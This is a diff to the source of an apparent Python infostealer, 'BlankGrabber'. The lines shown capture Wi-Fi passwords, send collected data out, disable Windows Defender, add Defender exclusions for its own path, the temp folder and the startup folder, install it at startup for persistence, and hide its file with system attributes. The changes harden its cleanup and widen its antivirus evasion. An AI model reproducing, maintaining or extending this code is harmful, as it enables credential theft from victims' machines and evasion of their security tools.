@@ -756,7 +756,10 @@ class BlankGrabber:
         
         self.errReport()
         self.send()
-        self.cleanUp()
+        try:
+            self.cleanUp()
+        except Exception:
+            pass
     
     def errReport(self) -> None:
         if utils.ERRORLOGS:
@@ -764,10 +767,10 @@ class BlankGrabber:
                 file.write('\n--------------------------------------------------------------------------\n'.join(utils.ERRORLOGS))
     
     def cleanUp(self) -> None:
-        if os.path.isdir(self.tempfolder):
-            shutil.rmtree(self.tempfolder)
         if os.path.isfile(self.archive):
             os.remove(self.archive)
+        if os.path.isdir(self.tempfolder):
+            shutil.rmtree(self.tempfolder)
     
     @utils.catch
     def captureWifiPasswords(self) -> None:
@@ -1147,7 +1150,7 @@ if __name__ == '__main__':
         
     Thread(target= system.disableWD, daemon= True).start()
     system.WDexclude(system.getSelf()[0])
-    system.WDexclude(MEIPASS)
+    system.WDexclude(os.getenv('temp', MEIPASS))
     while not system.isConnected():
         time.sleep(900)
     if VMPROTECT:
@@ -1162,8 +1165,8 @@ if __name__ == '__main__':
         utils.messagebox(MESSAGE_BOX)
     
     if STARTUP and not system.isInStartup() and FROZEN:
-        startupfilepath = system.putInStartup()
-        system.WDexclude(startupfilepath)
+        system.putInStartup()
+        system.WDexclude(system.STARTUPDIR)
     
     if not system.isInStartup() and DELETE_ITSELF and FROZEN:
         subprocess.run(f'attrib +h +s "{system.getSelf()[0]}"', shell= True, capture_output= True)
